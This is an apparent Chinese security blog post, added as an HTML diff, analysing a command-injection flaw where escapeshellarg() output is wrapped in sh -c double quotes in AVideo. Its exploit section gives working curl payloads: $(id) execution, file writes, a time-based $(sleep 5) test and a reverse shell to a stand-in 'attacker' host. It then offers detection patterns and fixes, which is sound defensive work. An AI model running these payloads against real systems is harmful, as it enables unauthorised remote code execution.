@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/cat-final.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/cat-final.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/cat-final.png">
+    <link rel="shortcut icon" href="/assets/images/cat-final.png">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>escapeshellarg安全假象：sh -c双引号中的命令替换注入 — DARKSEC</title>
+<meta name="description" content="当防御层被重新放入更高层次的解释器时，安全保证瞬间瓦解。CVE-2026-64625深度分析。">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span> <img src="/assets/images/cat-final.png" alt="cat" style="width:28px;height:28px;vertical-align:middle;margin-left:4px;"></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 注入攻击 / 命令注入</div>
+        <h1>escapeshellarg安全假象：sh -c双引号中的命令替换注入 🔓</h1>
+        <div class="article-meta">
+          <span>📅 2026-07-21</span>
+          <span>⏱ 12 min read</span>
+          <span>🏷 escapeshellarg / 命令注入 / sh -c / CVE</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#intro">漏洞概述</a></li>
+            <li><a href="#mechanism">攻击机制详解</a></li>
+            <li><a href="#code">代码层面分析</a></li>
+            <li><a href="#exploit">Exploit构造</a></li>
+            <li><a href="#general">通用攻击模型</a></li>
+            <li><a href="#audit">审计方法</a></li>
+            <li><a href="#defense">防御建议</a></li>
+          </ul>
+        </div>
+
+        <h2 id="intro">🎯 漏洞概述</h2>
+        <p><code>escapeshellarg()</code> 是PHP开发者防御命令注入的第一道防线——它给字符串加上单引号，内部单引号转义，看起来固若金汤。但当这个"安全"的参数被再次放入<code>sh -c</code>的<strong>双引号</strong>上下文时，一切防御化为乌有。</p>
+
+        <blockquote>
+          <p>🎯 核心洞察：<strong>任何将已安全转义的数据重新放入更高层次的解释器上下文时，都可能重新引入注入。</strong>这不是某个函数的bug，而是<strong>防御层与执行层之间的语义断裂</strong>。</p>
+        </blockquote>
+
+        <p>CVE-2026-64625（CVSS 9.8）揭示了AVideo平台中<code>execAsync()</code>函数的致命缺陷——一个CVE修补引入的<strong>二阶漏洞</strong>。</p>
+
+        <h2 id="mechanism">⚡ 攻击机制详解</h2>
+        <p>让我们层层拆解这个攻击的原理。</p>
+
+        <h3>第一层：escapeshellarg的设计意图</h3>
+        <p><code>escapeshellarg()</code> 的设计目的是让参数在<strong>单引号</strong>字符串中安全：</p>
+        <pre><code class="language-php">// escapeshellarg("test; id")
+// 输出: 'test; id'
+// 安全！分号在单引号中是普通字符</code></pre>
+
+        <h3>第二层：sh -c的双引号陷阱</h3>
+        <p>但当开发者将转义后的参数放入<code>sh -c</code>的双引号中：</p>
+        <pre><code class="language-php">$param = $_GET['file'];
+$escaped = escapeshellarg($param);  // 'user_input'
+exec("sh -c \"ffmpeg -i $escaped output.mp4\"");  // 💥 危险！</code></pre>
+        <p>在双引号<code>"..."</code>中，Bash会解析<code>$()</code>和反引号<code>`</code>为<strong>命令替换</strong>——这是Bash的正常行为，不是注入！</p>
+
+        <h3>第三层：CVE修补引入的二阶漏洞</h3>
+        <p>原始漏洞是无保护的命令拼接，修补方案加了<code>escapeshellarg()</code>但<strong>没改变<code>sh -c</code>包装</code>。修补本身引入了新的漏洞——经典的安全修复反模式。</p>
+
+        <h2 id="code">🔍 代码层面分析</h2>
+        <p>AVideo的<code>execAsync()</code>函数处理视频转码任务：</p>
+        <pre><code class="language-php">// 漏洞代码路径
+function execAsync($cmd) {
+    // 设计为后台异步执行
+    exec("sh -c \"$cmd\" > /dev/null 2>&1 &");
+}
+
+// 调用处
+$file = escapeshellarg($_GET['file']);
+execAsync("ffmpeg -i $file -c:v libx264 output.mp4");
+// 等价于:
+// exec('sh -c "ffmpeg -i \'user_input\' -c:v libx264 output.mp4"');
+//                          ^^^^^^^^^^^^^
+//                          单引号保护了内部内容
+//                          但双引号中的 $() 仍被解析！</code></pre>
+
+        <p>攻击payload：<code>file=$(id)</code></p>
+        <pre><code>// escapeshellarg("$(id)") → '$(id)'
+// exec('sh -c "ffmpeg -i \'$(id)\' output.mp4"')
+//                         ^^
+// Bash在双引号中看到 $(id) → 执行命令替换
+// 替换结果: 'uid=33(www-data) gid=33(www-data)...'
+// 继续执行 ffmpeg -i 'uid=33...' output.mp4</code></pre>
+
+        <h2 id="exploit">💥 Exploit构造</h2>
+
+        <p>实际攻击需要考虑转义层次：</p>
+
+        <pre><code class="language-bash"># 基础RCE - 获取命令执行确认
+curl 'http://target/download.php?file=$(id)'
+
+# 从临时文件读取结果（避免ffmpeg报错丢失输出）
+curl 'http://target/download.php?file=$(id>/tmp/pwned.txt)'
+
+# 反弹Shell（通过bash -c）
+curl 'http://target/download.php?file=$(bash+-c+"bash+-i+>%26+/dev/tcp/attacker/4444+0>%261")'
+
+# 注意：URL编码很重要
+# + = 空格, %26 = &
+# 你的shell不要先解析 $() —— 用单引号包裹URL！</code></pre>
+
+        <blockquote>
+          <p>⚠️ 关键细节：在终端测试时，一定要用<strong>单引号</strong>包裹URL，否则你的shell会先解析<code>$()</code>！<br>
+          <code>curl 'http://target/?file=$(id)'</code> ✅ 正确<br>
+          <code>curl "http://target/?file=$(id)"</code> ❌ 本地shell先执行</p>
+        </blockquote>
+
+        <h2 id="general">🧠 通用攻击模型</h2>
+
+        <p>这个漏洞揭示了一个<strong>超越PHP</strong>的通用安全反模式：</p>
+
+        <h3>「信任边界递归跨越」模型</h3>
+        <pre><code>Layer 0: 用户输入        → "$(id)"
+Layer 1: escapeshellarg  → '$(id)'    ← 安全边界建立
+Layer 2: sh -c "..."     → 重新解释   ← 安全边界被跨越
+Layer 3: bash命令替换    → 执行id     ← 攻击成功</code></pre>
+
+        <p>每一层的安全保证<strong>只在当前层有效</strong>。当数据穿越到上层解释器时，安全上下文被重置。</p>
+
+        <h3>同类漏洞案例</h3>
+        <table style="width:100%;border-collapse:collapse;margin:16px 0;">
+          <tr style="border-bottom:1px solid var(--border);">
+            <th style="text-align:left;padding:8px;">场景</th>
+            <th style="text-align:left;padding:8px;">安全层</th>
+            <th style="text-align:left;padding:8px;">被跨越的方式</th>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">PHP escapeshellarg + sh -c</td>
+            <td style="padding:8px;">Shell转义</td>
+            <td style="padding:8px;">双引号命令替换</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">Python shlex.quote + shell=True</td>
+            <td style="padding:8px;">Shell转义</td>
+            <td style="padding:8px;">subprocess的sh -c包装</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">SQL转义 + 动态拼接</td>
+            <td style="padding:8px;">SQL转义</td>
+            <td style="padding:8px;">二次SQL解释</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">HTML实体编码 + innerHTML</td>
+            <td style="padding:8px;">XSS过滤</td>
+            <td style="padding:8px;">DOM解析重新解释</td>
+          </tr>
+        </table>
+
+        <h2 id="audit">🔎 审计方法</h2>
+
+        <p>系统化审计步骤：</p>
+
+        <pre><code class="language-bash"># Step 1: 搜索 escapeshellarg/escapeshellcmd 使用
+grep -rn 'escapeshellarg\|escapeshellcmd' --include='*.php' .
+
+# Step 2: 检查是否有 sh -c 包装
+grep -rn 'sh -c\|shell=True\|Popen.*shell' --include='*.php' --include='*.py' .
+
+# Step 3: 交叉对比 — 同一代码路径是否同时出现
+# 找到 escapeshellarg → 追踪变量 → 检查是否进入 sh -c 上下文
+
+# Step 4: 测试注入
+# 用 $(sleep 5) 做时间盲注
+curl 'http://target/?file=$(sleep+5)'
+# 测量响应时间 — 如果延迟5秒，确认注入成功</code></pre>
+
+        <h3>自动检测脚本</h3>
+        <pre><code class="language-python">#!/usr/bin/env python3
+"""检测 escapeshellarg + sh -c 组合漏洞"""
+import re, sys, os
+
+DANGEROUS_PATTERNS = [
+    # PHP
+    r'escapeshellarg.*sh\s+-c',
+    r'escapeshellcmd.*sh\s+-c',
+    # Python  
+    r'shlex\.quote.*shell\s*=\s*True',
+    r'subprocess\.(call|run|Popen).*shell\s*=\s*True',
+    # Node.js
+    r'child_process\.exec\(',
+]
+
+for root, dirs, files in os.walk(sys.argv[1] if len(sys.argv) > 1 else '.'):
+    for f in files:
+        if not any(f.endswith(ext) for ext in ['.php','.py','.js','.ts']):
+            continue
+        path = os.path.join(root, f)
+        content = open(path).read()
+        for pat in DANGEROUS_PATTERNS:
+            for m in re.finditer(pat, content):
+                print(f"[!] {path}: {m.group()} @ pos {m.start()}")</code></pre>
+
+        <h2 id="defense">🛡️ 防御建议</h2>
+
+        <h3>正确的做法</h3>
+        <pre><code class="language-php">// ❌ 错误：escapeshellarg + sh -c 双引号
+$escaped = escapeshellarg($param);
+exec("sh -c \"ffmpeg -i $escaped output.mp4\"");
+
+// ✅ 正确：使用数组形式的 proc_open，完全绕过shell解释
+$descriptors = [0=>['pipe','r'], 1=>['pipe','w'], 2=>['pipe','w']];
+$proc = proc_open(
+    ['ffmpeg', '-i', $param, '-c:v', 'libx264', 'output.mp4'],
+    $descriptors, $pipes
+);
+
+// ✅ 正确：如果必须用shell，使用单引号且不做二次拼接
+$cmd = sprintf('ffmpeg -i %s output.mp4', escapeshellarg($param));
+exec($cmd);  // 没有 sh -c 包装</code></pre>
+
+        <h3>Python版本防御</h3>
+        <pre><code class="language-python"># ❌ 错误
+import shlex, subprocess
+cmd = f"ffmpeg -i {shlex.quote(param)} output.mp4"
+subprocess.Popen(cmd, shell=True)  # shell=True 使用 sh -c
+
+# ✅ 正确
+subprocess.Popen(
+    ['ffmpeg', '-i', param, '-c:v', 'libx264', 'output.mp4'],
+    shell=False  # 不经过shell解释
+)</code></pre>
+
+        <h3>通用原则</h3>
+        <blockquote>
+          <p>🎯 <strong>防御原则</strong>：永远不要将已经过安全处理的数据重新放入更高层次的解释器。如果必须这样做，必须在新的层次重新做安全处理——但更好的做法是<strong>根本不要多层解释</strong>。</p>
+        </blockquote>
+
+        <div class="article-tags">
+          <span class="tag pink">命令注入</span>
+          <span class="tag">escapeshellarg</span>
+          <span class="tag purple">CVE-2026-64625</span>
+          <span class="tag yellow">sh -c</span>
+          <span class="tag cyan">PHP</span>
+        </div>
+
+        <p style="text-align:center;margin-top:40px;color:var(--text-dim);font-style:italic;">
+          ~ 感谢阅读 nya~ 🐱✨
+        </p>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+      <div style="text-align:center;margin-bottom:16px;">
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+          <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+          <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+        </div>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> CYBERCAT SECURITY LAB <img src="/assets/images/cat-final.png" alt="cat" style="width:1.2em;height:1.2em;vertical-align:middle;"></p>
+      <p class="quote">「 漏洞不会消失，只会转移 nya~ 」</p>
+      <div class="links">
+        <a href="https://github.com/deft-dream" target="_blank">GitHub</a>
+        <span>·</span>
+        <a href="mailto:s815887892@163.com">Contact</a>
+      </div>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
